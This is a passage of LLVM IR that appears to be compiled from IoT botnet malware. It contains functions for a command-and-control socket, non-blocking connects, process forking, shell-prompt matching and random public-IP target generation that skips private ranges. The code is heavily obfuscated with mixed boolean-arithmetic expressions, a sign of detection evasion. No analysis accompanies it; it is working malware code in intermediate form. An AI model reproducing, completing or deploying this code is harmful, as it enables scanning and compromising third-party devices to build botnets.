  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %114

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %106, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %113

; <label>:60:                                     ; preds = %57
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %65 = getelementptr inbounds [16 x i64], [16 x i64]* %64, i64 0, i64 0
  %66 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %65) #5, !srcloc !3
  %67 = extractvalue { i64, i64* } %66, 0
  %68 = extractvalue { i64, i64* } %66, 1
  %69 = trunc i64 %67 to i32
  store i32 %69, i32* %14, align 4
  %70 = ptrtoint i64* %68 to i64
  %71 = trunc i64 %70 to i32
  store i32 %71, i32* %15, align 4
  br label %72

; <label>:72:                                     ; preds = %63
  %73 = load i32, i32* %5, align 4
  %74 = srem i32 %73, 64
  %75 = zext i32 %74 to i64
  %76 = shl i64 1, %75
  %77 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %78 = load i32, i32* %5, align 4
  %79 = sdiv i32 %78, 64
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [16 x i64], [16 x i64]* %77, i64 0, i64 %80
  %82 = load i64, i64* %81, align 8
  %83 = xor i64 %82, -1
  %84 = xor i64 %76, -1
  %85 = xor i64 7223899551733486768, -1
  %86 = and i64 %83, 7223899551733486768
  %87 = and i64 %82, %85
  %88 = and i64 %84, 7223899551733486768
  %89 = and i64 %76, %85
  %90 = or i64 %86, %87
  %91 = or i64 %88, %89
  %92 = xor i64 %90, %91
  %93 = or i64 %83, %84
  %94 = xor i64 %93, -1
  %95 = or i64 7223899551733486768, %85
  %96 = and i64 %94, %95
  %97 = or i64 %92, %96
  %98 = or i64 %82, %76
  store i64 %97, i64* %81, align 8
  %99 = load i32, i32* %5, align 4
  %100 = add i32 %99, 1204975571
  %101 = add i32 %100, 1
  %102 = sub i32 %101, 1204975571
  %103 = add nsw i32 %99, 1
  %104 = call i32 @select(i32 %102, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %104, i32* %12, align 4
  %105 = icmp sle i32 %104, 0
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %72
  %107 = load i32, i32* %13, align 4
  %108 = add i32 %107, 144071973
  %109 = add i32 %108, 1
  %110 = sub i32 %109, 144071973
  %111 = add nsw i32 %107, 1
  store i32 %110, i32* %13, align 4
  br label %57

; <label>:112:                                    ; preds = %72
  br label %113

; <label>:113:                                    ; preds = %112, %57
  br label %114

; <label>:114:                                    ; preds = %113, %33
  store i32 0, i32* %18, align 4
  %115 = load i8*, i8** %6, align 8
  store i8* %115, i8** %17, align 8
  br label %116

; <label>:116:                                    ; preds = %136, %114
  %117 = load i32, i32* %7, align 4
  %118 = sub i32 0, -1
  %119 = sub i32 %117, %118
  %120 = add nsw i32 %117, -1
  store i32 %119, i32* %7, align 4
  %121 = icmp sgt i32 %117, 1
  br i1 %121, label %122, label %142

; <label>:122:                                    ; preds = %116
  %123 = load i32, i32* @mainCommSock, align 4
  %124 = call i64 @recv(i32 %123, i8* %16, i64 1, i32 0)
  %125 = icmp ne i64 %124, 1
  br i1 %125, label %126, label %128

; <label>:126:                                    ; preds = %122
  %127 = load i8*, i8** %17, align 8
  store i8 0, i8* %127, align 1
  store i32 -1, i32* %4, align 4
  br label %145

; <label>:128:                                    ; preds = %122
  %129 = load i8, i8* %16, align 1
  %130 = load i8*, i8** %17, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %17, align 8
  store i8 %129, i8* %130, align 1
  %132 = load i8, i8* %16, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 10
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %128
  br label %142

; <label>:136:                                    ; preds = %128
  %137 = load i32, i32* %18, align 4
  %138 = add i32 %137, 2092988901
  %139 = add i32 %138, 1
  %140 = sub i32 %139, 2092988901
  %141 = add nsw i32 %137, 1
  store i32 %140, i32* %18, align 4
  br label %116

; <label>:142:                                    ; preds = %135, %116
  %143 = load i8*, i8** %17, align 8
  store i8 0, i8* %143, align 1
  %144 = load i32, i32* %18, align 4
  store i32 %144, i32* %4, align 4
  br label %145

; <label>:145:                                    ; preds = %142, %126
  %146 = load i32, i32* %4, align 4
  ret i32 %146
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 -7231508479981519938, -1
  %26 = and i64 %23, -7231508479981519938
  %27 = and i64 %22, %25
  %28 = and i64 %24, -7231508479981519938
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -7231508479981519938, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #10
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %128

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %112

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #10
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %110

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #5, !srcloc !4
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = and i64 %88, %82
  %90 = xor i64 %88, %82
  %91 = or i64 %89, %90
  %92 = or i64 %88, %82
  store i64 %91, i64* %87, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 %93, -66036076
  %95 = add i32 %94, 1
  %96 = add i32 %95, -66036076
  %97 = add nsw i32 %93, 1
  %98 = call i32 @select(i32 %96, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %108

; <label>:100:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %101 = load i32, i32* %6, align 4
  %102 = bitcast i32* %14 to i8*
  %103 = call i32 @getsockopt(i32 %101, i32 1, i32 4, i8* %102, i32* %13) #5
  %104 = load i32, i32* %14, align 4
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %100
  store i32 0, i32* %5, align 4
  br label %128

; <label>:107:                                    ; preds = %100
  br label %109

; <label>:108:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %128

; <label>:109:                                    ; preds = %107
  br label %111

; <label>:110:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %128

; <label>:111:                                    ; preds = %109
  br label %112

; <label>:112:                                    ; preds = %111, %52
  %113 = load i32, i32* %6, align 4
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = sext i32 %114 to i64
  store i64 %115, i64* %15, align 8
  %116 = load i64, i64* %15, align 8
  %117 = xor i64 %116, -1
  %118 = xor i64 -2049, -1
  %119 = xor i64 8857705945876077176, -1
  %120 = or i64 %117, %118
  %121 = or i64 8857705945876077176, %119
  %122 = xor i64 %120, -1
  %123 = and i64 %122, %121
  %124 = and i64 %116, -2049
  store i64 %123, i64* %15, align 8
  %125 = load i32, i32* %6, align 4
  %126 = load i64, i64* %15, align 8
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %125, i32 4, i64 %126)
  store i32 1, i32* %5, align 4
  br label %128

; <label>:128:                                    ; preds = %112, %110, %108, %106, %51
  %129 = load i32, i32* %5, align 4
  ret i32 %129
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %60

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 0, 1
  %13 = sub i64 %11, %12
  %14 = add i64 %11, 1
  store i64 %13, i64* @numpids, align 8
  %15 = load i64, i64* @numpids, align 8
  %16 = sub i64 %15, -7723537943892001074
  %17 = add i64 %16, 1
  %18 = add i64 %17, -7723537943892001074
  %19 = add i64 %15, 1
  %20 = mul i64 %18, 4
  %21 = call noalias i8* @malloc(i64 %20) #5
  %22 = bitcast i8* %21 to i32*
  store i32* %22, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %23

; <label>:23:                                     ; preds = %42, %10
  %24 = load i32, i32* %4, align 4
  %25 = zext i32 %24 to i64
  %26 = load i64, i64* @numpids, align 8
  %27 = add i64 %26, 4637839919658894661
  %28 = sub i64 %27, 1
  %29 = sub i64 %28, 4637839919658894661
  %30 = sub i64 %26, 1
  %31 = icmp ult i64 %25, %29
  br i1 %31, label %32, label %47

; <label>:32:                                     ; preds = %23
  %33 = load i32*, i32** @pids, align 8
  %34 = load i32, i32* %4, align 4
  %35 = zext i32 %34 to i64
  %36 = getelementptr inbounds i32, i32* %33, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = load i32*, i32** %3, align 8
  %39 = load i32, i32* %4, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds i32, i32* %38, i64 %40
  store i32 %37, i32* %41, align 4
  br label %42

; <label>:42:                                     ; preds = %32
  %43 = load i32, i32* %4, align 4
  %44 = sub i32 0, 1
  %45 = sub i32 %43, %44
  %46 = add i32 %43, 1
  store i32 %45, i32* %4, align 4
  br label %23

; <label>:47:                                     ; preds = %23
  %48 = load i32, i32* %2, align 4
  %49 = load i32*, i32** %3, align 8
  %50 = load i64, i64* @numpids, align 8
  %51 = sub i64 %50, 594852657337429433
  %52 = sub i64 %51, 1
  %53 = add i64 %52, 594852657337429433
  %54 = sub i64 %50, 1
  %55 = getelementptr inbounds i32, i32* %49, i64 %53
  store i32 %48, i32* %55, align 4
  %56 = load i32*, i32** @pids, align 8
  %57 = bitcast i32* %56 to i8*
  call void @free(i8* %57) #5
  %58 = load i32*, i32** %3, align 8
  store i32* %58, i32** @pids, align 8
  %59 = load i32, i32* %2, align 4
  store i32 %59, i32* %1, align 4
  br label %60

; <label>:60:                                     ; preds = %47, %8
  %61 = load i32, i32* %1, align 4
  ret i32 %61
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.486, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %112, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %118

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = add i64 0, 2291359169410499199
  %30 = sub i64 %29, %28
  %31 = sub i64 %30, 2291359169410499199
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %81, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, -8660058940965211763
  %45 = sub i64 %44, %43
  %46 = add i64 %45, -8660058940965211763
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %81, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 0, %58
  %60 = add i64 0, %59
  %61 = sub i64 0, %58
  %62 = getelementptr inbounds i8, i8* %56, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %81, label %66

; <label>:66:                                     ; preds = %52
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = add i64 0, -3052240936686866354
  %74 = sub i64 %73, %72
  %75 = sub i64 %74, -3052240936686866354
  %76 = sub i64 0, %72
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %66, %52, %37, %22
  %82 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %80, %66 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = sub i32 0, 1
  %88 = sub i32 %86, %87
  %89 = add nsw i32 %86, 1
  store i32 %88, i32* %7, align 4
  br label %18

; <label>:90:                                     ; preds = %83
  %91 = load i8*, i8** %3, align 8
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i32, i32* %7, align 4
  %96 = sext i32 %95 to i64
  %97 = sub i64 0, %96
  %98 = add i64 0, %97
  %99 = sub i64 0, %96
  %100 = getelementptr inbounds i8, i8* %94, i64 %98
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = load i8*, i8** %4, align 8
  %104 = load i32, i32* %6, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %102, %108
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %90
  store i32 1, i32* %2, align 4
  br label %119

; <label>:111:                                    ; preds = %90
  br label %112

; <label>:112:                                    ; preds = %111
  %113 = load i32, i32* %6, align 4
  %114 = sub i32 %113, 778369996
  %115 = add i32 %114, 1
  %116 = add i32 %115, 778369996
  %117 = add nsw i32 %113, 1
  store i32 %116, i32* %6, align 4
  br label %11

; <label>:118:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %119

; <label>:119:                                    ; preds = %118, %110
  %120 = load i32, i32* %2, align 4
  ret i32 %120
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %132, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %130, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 10
  br i1 %21, label %130, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 100
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp sge i32 %28, 64
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp sle i32 %32, 127
  br i1 %33, label %130, label %34

; <label>:34:                                     ; preds = %30, %26, %22
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 127
  br i1 %37, label %130, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 169
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 254
  br i1 %45, label %130, label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 172
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp sle i32 %52, 16
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sle i32 %56, 31
  br i1 %57, label %130, label %58

; <label>:58:                                     ; preds = %54, %50, %46
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 192
  br i1 %61, label %62, label %70

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %70

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 2
  br i1 %69, label %130, label %70

; <label>:70:                                     ; preds = %66, %62, %58
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 192
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 88
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 99
  br i1 %81, label %130, label %82

; <label>:82:                                     ; preds = %78, %74, %70
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 192
  br i1 %85, label %86, label %90

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 168
  br i1 %89, label %130, label %90

; <label>:90:                                     ; preds = %86, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 198
  br i1 %93, label %94, label %102

; <label>:94:                                     ; preds = %90
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 18
  br i1 %97, label %130, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 19
  br i1 %101, label %130, label %102

; <label>:102:                                    ; preds = %98, %90
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
